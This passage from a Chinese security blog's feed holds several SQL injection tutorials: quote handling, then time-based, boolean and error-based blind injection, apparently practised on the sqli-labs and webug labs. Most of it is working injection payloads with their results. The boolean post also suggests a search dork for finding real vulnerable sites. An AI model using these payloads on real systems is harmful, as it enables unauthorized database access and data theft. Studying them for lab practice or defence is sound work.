|</span><br><span class="line">|  5 | stupid   | 11       |</span><br><span class="line">|  6 | superman | 11       |</span><br><span class="line">|  7 | batman   | 11       |</span><br><span class="line">|  8 | admin    | admin#   |</span><br><span class="line">|  9 | admin1   | 11       |</span><br><span class="line">| 10 | admin2   | 11       |</span><br><span class="line">| 11 | admin3   | 11       |</span><br><span class="line">| 12 | dhakkan  | 11       |</span><br><span class="line">| 14 | admin4   | 11       |</span><br><span class="line">| 13 | admin&#x27;   | passwd   |</span><br><span class="line">+----+----------+----------+</span><br><span class="line">14 rows in set (0.00 sec)</span><br></pre></td></tr></table></figure><p>怎么样，我们插入了 admin'，这就是我所说的两个单引号在字段中会被当成一个单引号，这也就和上面我检测注入点时的报错一样了，我使用payload 之后，实际 sql 语句为：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> username, password <span class="keyword">FROM</span> users <span class="keyword">WHERE</span> username<span class="operator">=</span>(<span class="string">&#x27;admin&#x27;&#x27;) and password=(&#x27;</span>admin<span class="string">&#x27;) LIMIT 0</span></span><br><span class="line"><span class="string">,1;</span></span><br></pre></td></tr></table></figure><p>这里 admin'' ) ，正常来说，应该是('admin')，如果要在字段中包含单引号，应该是('admin'') 或 ("admin'")(后者外围是双引号，我也测试过：正常)，所以它报错认为你少了右边一个单引号来与最左边的单引号闭合，它将 admin'' 看为了一个字段名（数据名）。另外，也可以用 转义单引号，即：username='admin\''</p><p>下面我们使用双引号包裹</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; insert into users values(15,&quot;admin&#x27;&#x27;&quot;,&#x27;passwd&#x27;);</span><br><span class="line">Query OK, 1 row affected (0.00 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; select * from users;</span><br><span class="line">+----+----------+----------+</span><br><span class="line">| id | username | password |</span><br><span class="line">+----+----------+----------+</span><br><span class="line">|  1 | Dumb     | 11       |</span><br><span class="line">|  2 | Angelina | 11       |</span><br><span class="line">|  3 | Dummy    | 11       |</span><br><span class="line">|  4 | secure   | 11       |</span><br><span class="line">|  5 | stupid   | 11       |</span><br><span class="line">|  6 | superman | 11       |</span><br><span class="line">|  7 | batman   | 11       |</span><br><span class="line">|  8 | admin    | admin#   |</span><br><span class="line">|  9 | admin1   | 11       |</span><br><span class="line">| 10 | admin2   | 11       |</span><br><span class="line">| 11 | admin3   | 11       |</span><br><span class="line">| 12 | dhakkan  | 11       |</span><br><span class="line">| 14 | admin4   | 11       |</span><br><span class="line">| 15 | admin&#x27;&#x27;  | passwd   |</span><br><span class="line">| 13 | admin&#x27;   | passwd   |</span><br><span class="line">+----+----------+----------+</span><br><span class="line">15 rows in set (0.00 sec)</span><br></pre></td></tr></table></figure><p>可见，双引号的 "admin''" 插入为admin''，这告诉我们，内外围外围用双引号的话，里面的单引号就是正常的，你写一个单引号就是插入一个单引号。</p><p>即："admin'" 与 'admin''' 与'admin\'' 效果是一样的。</p><p>下面看看查询：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select username,password from users where username=(&#x27;admin&#x27;&#x27;&#x27;);</span><br><span class="line">+----------+----------+</span><br><span class="line">| username | password |</span><br><span class="line">+----------+----------+</span><br><span class="line">| admin&#x27;   | passwd   |</span><br><span class="line">+----------+----------+</span><br><span class="line">1 row in set (0.00 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; select username,password from users where username=(&quot;admin&#x27;&#x27;&quot;);</span><br><span class="line">+----------+----------+</span><br><span class="line">| username | password |</span><br><span class="line">+----------+----------+</span><br><span class="line">| admin&#x27;&#x27;  | passwd   |</span><br><span class="line">+----------+----------+</span><br><span class="line">1 row in set (0.00 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; select username,password from users where username=(&quot;admin&#x27;&quot;);</span><br><span class="line">+----------+----------+</span><br><span class="line">| username | password |</span><br><span class="line">+----------+----------+</span><br><span class="line">| admin&#x27;   | passwd   |</span><br><span class="line">+----------+----------+</span><br><span class="line">1 row in set (0.00 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; select username,password from users where username=(&#x27;admin\&#x27;&#x27;)</span><br><span class="line">+----------+----------+</span><br><span class="line">| username | password |</span><br><span class="line">+----------+----------+</span><br><span class="line">| admin&#x27;   | passwd   |</span><br><span class="line">+----------+----------+</span><br><span class="line">1 row in set (0.00 sec)</span><br></pre></td></tr></table></figure><p>补：</p><ol type="1"><li>mysql的字段名、表名通常不需要加任何引号，如果非要加上引号，加反引号，用来与mysql 的关键字相区分，避免冲突。</li><li>单引号和双引号都可以表示字符串；</li></ol><p>当然，less 13 ，注入还是老套路。</p><p>没有回显等，可以用布尔注入或报错，最后尝试时间注入。</p><h2 id="测试布尔注入">测试布尔注入</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uname=admin<span class="string">&#x27;) and left(version(),1)&gt;5 #&amp;passwd=admin</span></span><br></pre></td></tr></table></figure><p>测试成功</p><h2 id="测试报错注入">测试报错注入</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uname=admin<span class="string">&#x27;) and extractvalue(1,concat(0x23,(select version()))) #&amp;passwd=admin</span></span><br></pre></td></tr></table></figure><p>XPATH syntax error: '#5.5.53' 测试成功</p><h1 id="总结回顾">总结回顾</h1><p>测试成功</p><ol type="1"><li><p>判断是不是回显注入，主要看查询正常时，有没有回显查询的数据。</p></li><li><p>报错注入存在与否，主要是 php 源码中有没有print_r(mysql_error());</p></li><li><p>布尔注入，主要在于 if($row) 两种情况的回显处理是否相同。</p></li><li><p>延时注入存在与否取决于什么？暂不知道 emm，以后知道再补。</p></li></ol>]]></content>
      
      
      <categories>
          
          <category> websec </category>
          
          <category> sql injection </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>基于时间的盲注</title>
      <link href="/blog/2019/07/27/websec/sql_injection/time_based_blind_sql_injection/"/>
      <url>/blog/2019/07/27/websec/sql_injection/time_based_blind_sql_injection/</url>
      
        <content type="html"><![CDATA[<p>一般猜测/尝试顺序：</p><p>回显注入（单引号-&gt;没引号/双引号-&gt;括号-&gt;括号与单/双引号）-&gt;布尔盲注/报错盲注-&gt;时间注入</p><h1 id="时间盲注简介">时间盲注简介</h1><p>所谓延时注入主要针对页面无变化，无法用布尔真假判断，无法报错的情况下注入。延时注入是通过页面返回的时间来判断的。</p><p>不同的 mysql 数据库版本，延迟注入语句也不同。 mysql &gt;= 5.0的可以使用 sleep 进行查询 sleep（5） mysql &lt; 5.0 的可以使用benchmark( )进行查询 select benchmark(1000,select * from admin);</p><h1 id="时间盲注常用函数">时间盲注常用函数</h1><ol type="1"><li><p>sleep(n)延长查询时间，延长 n 秒</p></li><li><p>if(exp1,exp2,exp3)如果 exp1 为真，那么执行 exp2，否则执行exp3.</p><p>比如： if(ascii(substr(version(),1,1))=65,1,sleep(5))</p><p>如果当前数据库版本的第一个字符的 ascii 码为65，那么正常执行，否则程序等待三秒再执行。</p></li></ol><h1 id="检测注入点">检测注入点</h1><p>先进行前面的一堆可能的注入特征检测，都没有后，可以使用一下注入语句，通过判断页面是否出现延迟来检测是否存在延时注入。</p><p>?id=1 and sleep(3) --+</p><p>?id=1 and if(1=1,1,sleep(3))</p><p>?id=1 and if(1=2,1,sleep(3))</p><p>一般，用第一个就能检测出来</p><h1 id="注入流程">注入流程</h1><p>注入流程是和布尔盲注差不多，除了多用了一个 if () 和 sleep语句，没别的。</p><h3 id="注入版本">注入版本</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?id=<span class="number">1</span><span class="string">&#x27; and if(left(version(),3)&gt;&#x27;</span><span class="number">5.5</span><span class="string">&#x27;,1,sleep(5)) --+</span></span><br><span class="line"><span class="string">?id=1&#x27;</span> <span class="keyword">and</span> <span class="keyword">if</span>(<span class="title function_ invoke__">left</span>(<span class="title function_ invoke__">version</span>(),<span class="number">6</span>)=<span class="string">&#x27;5.5.53&#x27;</span>,<span class="number">1</span>,<span class="title function_ invoke__">sleep</span>(<span class="number">5</span>)) --+</span><br></pre></td></tr></table></figure><p>结果：5.5.53</p><h3 id="注入当前数据库">注入当前数据库</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?id=<span class="number">1</span><span class="string">&#x27; and if(ascii(substr(database(),1,1))=116,1,sleep(5)) --+</span></span><br><span class="line"><span class="string">?id=1&#x27;</span> <span class="keyword">and</span> <span class="keyword">if</span>(<span class="title function_ invoke__">ascii</span>(<span class="title function_ invoke__">substr</span>(<span class="title function_ invoke__">database</span>(),<span class="number">2</span>,<span class="number">1</span>))&gt;<span class="number">100</span>,<span class="number">1</span>,<span class="title function_ invoke__">sleep</span>(<span class="number">5</span>)) --+</span><br></pre></td></tr></table></figure><p>一个字符字符的注入，最终，数据库名：security</p><h3 id="注入当前用户">注入当前用户</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=<span class="number">1</span><span class="string">&#x27; and if(ascii(substr(user(),1,1))&gt;113,1,sleep(3)) --+</span></span><br></pre></td></tr></table></figure><p>一个个注入，这里不再演示，结果应该是：root@localhost。</p><h3 id="当前数据库下的表的个数">当前数据库下的表的个数</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=<span class="number">1</span><span class="string">&#x27; and if((select count(table_name) from information_schema.tables where table_schema=&#x27;</span>security<span class="string">&#x27;)&gt;3,1,sleep(3)) --+</span></span><br></pre></td></tr></table></figure><p>4 个表</p><h3 id="当前数据库下的表名">当前数据库下的表名</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=<span class="number">1</span><span class="string">&#x27; and if(ascii(substr((select table_name from information_schema.tables where table_schema=&#x27;</span>security<span class="string">&#x27; limit 0,1),1,1))&gt;102,1,sleep(3)) --+</span></span><br></pre></td></tr></table></figure><p>猜到一半，我感觉是 email，然后验证。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=<span class="number">1</span><span class="string">&#x27; and if(left((select table_name from information_schema.tables where table_schema=&#x27;</span>security<span class="string">&#x27; limit 0,1),5)=&#x27;</span>email<span class="string">&#x27;,1,sleep(3)) --+</span></span><br></pre></td></tr></table></figure><p>验证成功，表名：emails，同理猜测出其他表名:referers，uagents，users</p><h3 id="email-的字段名">email 的字段名</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&#x27; and if(ascii(substr((select column_name from information_schema.columns where table_schema=&#x27;security&#x27; and table_name=&#x27;emails&#x27; limit 0,1),2,1))&gt;100,1,sleep(3)) --+</span><br></pre></td></tr></table></figure><p>第一个字段：id，然后类推。</p><h3 id="users-表中记录的个数">users 表中记录的个数</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=<span class="number">1</span><span class="string">&#x27; and if((select count(*) from users)&gt;13,1,sleep(3)) --+</span></span><br></pre></td></tr></table></figure><p>​ 13 条记录</p><h1 id="benchmark-函数">benchmark 函数</h1><p>除了 sleep 函数能够产生延时以外，benchmark函数同样能够达到类似效果，使用方法也是类似的，一般在 sleep用不了的时候，试试 benchmark</p><p>BENCHMARK(count,expr)用于测试函数的性能，参数一为执行次数，二为要执行的表达式。</p><p>可以让函数执行若干次，返回结果比平时要长，通过时间长短的变化，判断语句是否执行成功。这是一种边信道攻击，在运行过程中占用大量的cpu 资源。</p><p>比如：可以在 mysql cmd 执行：select benchmark(5000000,md5('helloworld'));</p><p>如果觉得慢，可以使用：select benchmark(5000000,sha('helloworld'));</p><p>计算 sha 摘要比计算 md5 摘要费时间。</p><p>举例</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=<span class="number">1</span><span class="string">&#x27; and if((select count(*) from users)&gt;19,1,benchmark(2000000,sha(&#x27;</span>hello<span class="string">&#x27;))) --+</span></span><br></pre></td></tr></table></figure><p>我一般使用 benchmark(2000000,sha('hello'));</p><h1 id="总结回顾">总结回顾</h1><ol type="1"><li>limit 下标是从 0 开始，substr 下标是从 1 开始</li></ol>]]></content>
      
      
      <categories>
          
          <category> websec </category>
          
          <category> sql injection </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>布尔盲注</title>
      <link href="/blog/2019/07/27/websec/sql_injection/boolean_based_sql_injection/"/>
      <url>/blog/2019/07/27/websec/sql_injection/boolean_based_sql_injection/</url>
      
        <content type="html"><![CDATA[<p>鉴于 sqli-lib less 5 和 webug 的布尔注入都不太规范，我又懒得看dvwa。于是，从网上找了个标准的布尔盲注的站点，自己测试了一下，这里就不在演示了。你可以使用inurl:php?id 去百度或谷歌一些网站看看。</p><h1 id="简介">简介</h1><p>在 <ahref="https://xuj.me/wiki/web_security/sql_injection/boolean_based_of_webug/">webug的布尔注入</a>已经谈到了</p><h1 id="布尔盲注常用函数">布尔盲注常用函数</h1><p><ahref="https://www.cnblogs.com/lcamry/p/5504374.htm">字符串截取函数</a></p><h2 id="常用摘抄自上面链接">常用（摘抄自上面链接）</h2><h3 id="left">left</h3><p>left(string，n)得到字符串左部指定个数的字符，一般我在猜测字符串时使用，比如：有些网站习惯于将一些数据库名/表名定义成自己网站的名字或网址去掉符号，还有一些常见的定义库表的名字，如果我逐个字符猜了几个看到和那个有匹配，我就用left 尝试去匹配一下，当然，直接用 left 一个一个字符猜也是可以的。</p><p>Sql 用例：</p><ol type="1"><li>left(database(), 1)&gt;'a' 查看数据库的第一位，left(database(),2)&gt;'ab' 查看数据库名前二位。</li></ol><p>left(version(), 1) &gt; '5'</p><ol start="2" type="1"><li>同样的 string 可以为自行构造的 sql 语句。</li></ol><h3 id="substr">substr</h3><p>substr(string, start, length) 第一个参数为要处理的字符串，start为开始位置，length 为截取的长度。</p><p>Sql 用例：</p><ol type="1"><li>substr(DATABASE(),1,1)&gt;’a’,查看数据库名第一位，substr(DATABASE(),2,1)查看数据库名第二位，依次查看各位字符。</li></ol><p>一般就用它来一个字符一个字符的猜。</p><h3 id="regexp-正则">regexp 正则</h3><p>这里，暂时还没用过，看下面链接吧，用到再说。</p><p><a href="https://www.cnblogs.com/lcamry/articles/5717442.html">sql盲注之正则表达式攻击</a></p><h1 id="流程">流程</h1><h3 id="猜字段">猜字段</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=<span class="number">10</span> order by <span class="number">14</span>--+</span><br></pre></td></tr></table></figure><h3 id="看显示位">看显示位</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-<span class="number">10</span> UNION SELECT <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>,<span class="number">7</span>,<span class="number">8</span>,<span class="number">9</span>,<span class="number">10</span>,<span class="number">11</span>,<span class="number">12</span>,<span class="number">13</span>,<span class="number">14</span> --+</span><br></pre></td></tr></table></figure><p>看看有没有显示位，<strong><em>一定注意：</em></strong>把 id = 10 改成id =-10，让前面查询无果(说道这里，大声哭泣..)，<strong>如果有显示位就没必要盲注了</strong>。</p><p>对于布尔盲注来说，当然是没有显示位了。</p><h3 id="数据库版本">数据库版本</h3><p>用 substr 一个个猜测，一般从 5 开始，5.6 和 5.7 比较常见，当然用 left也一样。注意：版本中的逗点也算一个字符。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">?id=<span class="number">10</span> <span class="keyword">and</span> <span class="title function_ invoke__">left</span>(<span class="title function_ invoke__">version</span>(),<span class="number">1</span>)=<span class="string">&#x27;5&#x27;</span> --+</span><br><span class="line"></span><br><span class="line">?id=<span class="number">10</span> <span class="keyword">and</span> <span class="title function_ invoke__">left</span>(<span class="title function_ invoke__">version</span>(),<span class="number">3</span>)=<span class="string">&#x27;5.6&#x27;</span> --+</span><br><span class="line"></span><br><span class="line">?id=<span class="number">10</span> <span class="keyword">and</span> <span class="title function_ invoke__">left</span>(<span class="title function_ invoke__">version</span>(),<span class="number">6</span>)=<span class="string">&#x27;5.6.19&#x27;</span> --+</span><br></pre></td></tr></table></figure><h3 id="猜当前数据库名">猜当前数据库名</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=<span class="number">10</span> <span class="keyword">and</span> <span class="title function_ invoke__">ascii</span>(<span class="title function_ invoke__">substr</span>(<span class="title function_ invoke__">database</span>(),<span class="number">1</span>,<span class="number">1</span>))&gt;<span class="number">97</span> --+</span><br></pre></td></tr></table></figure><p>二分思想，通过看页面是否正常，一个个猜，逐渐逼近。</p><p>当然，如果前几个字母网站名或常用名，不妨直接猜测整体试试。</p><h3 id="猜当前用户名">猜当前用户名</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=<span class="number">10</span> <span class="keyword">and</span> <span class="title function_ invoke__">length</span>(<span class="title function_ invoke__">user</span>())&gt;<span class="number">6</span> --+</span><br></pre></td></tr></table></figure><p>有的网站使用：网站名@localhost 的形式，还是一句话，随机应变。</p><h3 id="库中的表的个数">库中的表的个数</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=<span class="number">10</span> <span class="keyword">and</span> (select <span class="title function_ invoke__">count</span>(table_name) <span class="keyword">from</span> information_schema.tables where table_schema=<span class="title function_ invoke__">database</span>())&gt;<span class="number">5</span> --+</span><br></pre></td></tr></table></figure><h3 id="爆表">爆表</h3><h4 id="爆第一个表的长度">爆第一个表的长度</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=<span class="number">10</span> <span class="keyword">and</span> (select <span class="title function_ invoke__">length</span>((select table_name <span class="keyword">from</span> information_schema.tables where table_schema=<span class="title function_ invoke__">database</span>() limit <span class="number">0</span>,<span class="number">1</span>))=<span class="number">9</span>) --+</span><br></pre></td></tr></table></figure><h4 id="爆表的名称">爆表的名称</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=<span class="number">10</span> <span class="keyword">and</span> (select <span class="title function_ invoke__">ascii</span>(<span class="title function_ invoke__">substr</span>((select table_name <span class="keyword">from</span> information_schema.tables where table_schema=<span class="title function_ invoke__">database</span>() limit <span class="number">0</span>,<span class="number">1</span>),<span class="number">1</span>,<span class="number">1</span>))&gt;<span class="number">97</span>) --+</span><br></pre></td></tr></table></figure><p>后面就不详细讲了，参考回显注入语句与上面语句自己构造就好了。</p>]]></content>
      
      
      <categories>
          
          <category> websec </category>
          
          <category> sql injection </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>基于报错的盲注</title>
      <link href="/blog/2019/07/27/websec/sql_injection/error_based_sql_injection/"/>
      <url>/blog/2019/07/27/websec/sql_injection/error_based_sql_injection/</url>
      
        <content type="html"><![CDATA[<h1 id="基于报错的盲注简介">基于报错的盲注简介</h1><p>利用的是 SQL语句报错从而回显出我们想要的信息。首先我们需要找到一句能够报错的 SQL语句（即：在 mysql 数据库 cmd命令行中执行就会报错的语句，比如：double、BigInt 溢出，重复，还有由于mysql 设计缺陷造成自身的 bug 等）</p><p>报错语句各式各样，千奇百怪，你可以自己去找、去发现。当然，也有大神们给我们留下来的一些财富。感觉这一部分说难也难，说简单也简单。难是因为那些报错有时并不好找，甚至大神们找的报错的原理咱也搞不懂，简单是因为可以直接用大神找的可以报错的语句，有的报错原理不懂就不懂了，不影响咱们报错盲注。</p><p>下面附上几个链接，供基于报错的盲注使用：</p><p><a href="https://www.cnblogs.com/lcamry/p/5763129.html">MYSQL注入天书之盲注讲解</a></p><p><ahref="https://blog.csdn.net/qq_35544379/article/details/77453019">大神对一种报错方式原理的探究</a></p><p>典型的报错注入语句去上面链接找就行了。</p><h1 id="已知的报错注入方式">已知的报错注入方式</h1><p>下面只列出几种自己使用 sqli-lib less 5 复现成功的报错注入方式</p><h2 id="mysql-bug-865-rand和-group-by-同时使用">mysql Bug 865 rand()和group by 同时使用</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=<span class="number">1</span><span class="string">&#x27; union select 1,count(*),concat(0x23,(要查询的语句),0x23,floor(rand(0)*2))a from information_schema.columns group by a --+</span></span><br></pre></td></tr></table></figure><p>0x23 为 # 对应 ASCII 码的 16进制，用来隔离突出你查询的内容，便于你找到. 可以自己去 ASCII码表找其他的字符更换，建议使用 16进制，直接使用字符，可能有时候会被过滤掉。</p><p>后面那个 from information_schema.columns从哪个表查没啥意思，主要是需要只用 group by 让其和 rand()函数一起这样才能报错。</p><p><strong>我们只需要将我们的子查询语句写在上面 “要查询的语句”的位置即可。</strong></p><p>返回值不能超过 1 行数据，所以如果里面的 select 获取的是多行数据时要加limit，经测试我们要写子查询中不能含有 count(), group_concat语句，即：不能计数 和 只能 limit 0,1 一条一条来了。</p><p>举例：</p><p>查询所有表明</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=<span class="number">1</span><span class="string">&#x27; union select 1,count(*),concat(0x23,(select schema_name from information_schema.schemata limit 0,1),0x23,floor(rand(0)*2))a from information_schema.tables group by a --+</span></span><br></pre></td></tr></table></figure><p>回显：Duplicate entry '#information_schema#1' for key 'group_key'</p><p>然后改成 limit 1,1、limit 2,1 等慢慢测试。</p><h2 id="double-类型溢出报错">double 类型溢出报错</h2><p>暂无成功复现的</p><h2 id="bigint-溢出报错">BIGINT 溢出报错</h2><p>暂无成功复现的</p><h2 id="利用-xpath-函数">利用 xpath 函数</h2><p>MySQL 5.1.5 版本中添加了对 XML 文档进行查询和修改的函数，分别是extractvalue()和 updatexml()</p><p>经测试 mysql 8.0.12仍存在这两个报错，这两个报错函数，除了后者多一个参数外，很多特征都是相似的，下面的测试，一般来说，对这两个函数都是适用的。</p><p>返回值不能超过 1 行数据，所以如果里面的 select 获取的是多行数据时要加limit，可使用 group_concat 函数。</p><h3 id="extractvalue-报错">extractvalue 报错</h3><p>函数解释： 　　 extractvalue()：从目标 XML中返回包含所查询值的字符串。 　　 EXTRACTVALUE (XML_document,XPath_string); 　　第一个参数：XML_document 是 String 格式，为 XML文档对象的名称 　　第二个参数：XPath_string (Xpath 格式的字符串)</p><p>我们通过控制第二个参数进行报错注入，xml文档中查找字符位置时，应为/xxx/xxx/xxx这种格式，当第二个参数格式不正确时，就会产生 Xpath语法错误，并返回我们输入的错误语句的内容。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=<span class="number">1</span><span class="string">&#x27; and extractvalue(1,concat(0x7e,(要查询的语句),0x73)) --+</span></span><br></pre></td></tr></table></figure><p>0x7e 同样也是用来区分你的查询结果，改成0x23，即：#也行，但是不要输入英文字符的十六进制，建议 concat的第一个不要用来查数据，写个字符分开就好。总之，具体自己测试。</p><p>concat 可以再多连接我们 select 查询的信息，也可以使用 concat_ws</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=<span class="number">1</span><span class="string">&#x27; and extractvalue(1,concat_ws(0x23,0x23,(select version()),(select database()))) --+</span></span><br></pre></td></tr></table></figure><p>注意：报错回显有字符限制，测试为 32 个字符。</p><p>比如：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=<span class="number">1</span><span class="string">&#x27; and extractvalue(1,concat_ws(&#x27;</span>, <span class="string">&#x27;,0x23,(select version()),(select database()),(select user()),(select @@datadir))) --+</span></span><br></pre></td></tr></table></figure><p>回显</p><blockquote><p>XPATH syntax error: '#, 5.5.53, security, root@localh'</p></blockquote><h3 id="updatexml-报错">updatexml 报错</h3><p>UPDATEXML (XML_document, XPath_string, new_value);</p><p>第一个参数：XML_document 是 String 格式，为 XML 文档对象的名称第二个参数：XPath_string (Xpath 格式的字符串)第三个参数：new_value，String 格式，替换查找到的符合条件的数据</p><p>报错原理同 extractvalue() 第二个参数路径格式问题。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=<span class="number">1</span><span class="string">&#x27; and updatexml(1,concat(0x7e,(你要查询的语句)),1)--+</span></span><br></pre></td></tr></table></figure><p>当然，这里的 concat 也可以连接好多个，比如：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=<span class="number">1</span><span class="string">&#x27; and updatexml(1,concat(0x7e,(select version()),0x7e,(select database())),1)--+</span></span><br></pre></td></tr></table></figure><p>由于有字符个数限制，一般我使用的有下面两种语句，</p><ol type="1"><li><p>通过改变 limit 的第一个参数来一条记录查（而不使用 group_concat将所有连接成一个字符串）</p><p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&#x27; and extractvalue(1,concat_ws(0x23,0x23,(select schema_name from information_schema.schemata limit 0,1))) --+</span><br></pre></td></tr></table></figure></p><p>回显：</p><blockquote><p>XPATH syntax error: '##information_schema,challenges,'</p></blockquote></li><li><p>如果比较少，比如查出库/表的个数比较少之后，可以先试试group_concat 没准表名很多，全显示出来了。当然，group_concat 里面也有order by 看着来吧。</p><p>比如这里查出表的个数为 4 个</p><p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=<span class="number">1</span><span class="string">&#x27; and extractvalue(1,concat_ws(0x23,0x23,(select count(table_name) from information_schema.tables where table_schema=database()))) --+</span></span><br></pre></td></tr></table></figure></p><p>下面先用 group_concat 查一下看看。</p><p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=<span class="number">1</span><span class="string">&#x27; and extractvalue(1,concat_ws(0x23,0x23,(select group_concat(table_name) from information_schema.tables where table_schema=database() limit 0,1))) --+</span></span><br></pre></td></tr></table></figure></p><p>回显</p><blockquote><p>XPATH syntax error: '##emails,referers,uagents,users'</p></blockquote><p>像这样表名都比较短的话，就都查出来了，具体根据实际情况使用吧。</p></li></ol><h2 id="mysql-重复特性">mysql 重复特性</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=<span class="number">1</span><span class="string">&#x27; union select 1,2 from (select name_const(version(),1),name_const(version(),1))x --+</span></span><br></pre></td></tr></table></figure><p>前后两个 nameconst 的内容要一样。只能用来查询数据库版本，我测试过database(),user() 等均未成功。</p><h1 id="补limit-函数简介">补：limit 函数简介</h1><p>limit 函数的使用有点忘记了，再回顾一下。</p><p>SELECT column1, column2 FROM tbl_name LIMIT offset , count;</p><ol type="1"><li><p>limit 可以有两个参数，第一个参数是开始位置的偏移，从 0开始，第二个参数是最多显示的记录条数。</p></li><li><p>limit 也可以有一个参数的简写形式： limit n; 相当于 limit 0,n;从第一条开始，最多显示 n 条</p></li><li><p>SELECT * FROM products LIMIT 8 OFFSET 0; (在 mysql 5以后支持这种写法) ，这个指偏移为：0 位置，即开始位置，最多 8条数据。和第一种参数顺序相反，与第一种功能相同。</p></li></ol><h1 id="总结回顾">总结回顾</h1><ol type="1"><li>目前来看，报错注入最佳的语句便是 XPATH的两个函数（鉴于第二个函数多一个参数），最好的语句便是 XPATH 的extractvalue 语句了。</li></ol>]]></content>
      
      
      <categories>
          
          <category> websec </category>
          
          <category> sql injection </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
